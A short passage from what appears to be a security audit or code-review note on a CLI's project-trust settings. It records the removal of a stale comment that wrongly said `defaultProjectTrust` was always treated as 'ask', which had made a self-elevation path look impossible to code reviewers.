do today — inherits the same precondition, and inherits it silently.

A separate stale claim in `cli/project_trust.py` was struck: it said the CLI "does
not yet pass `extensions=` or `default_project_trust=`", so `defaultProjectTrust`
was "always treated as `ask`". `entry.py` passes both. That staleness was not
harmless — it made the self-elevation chain look structurally impossible to anyone
auditing by code read.

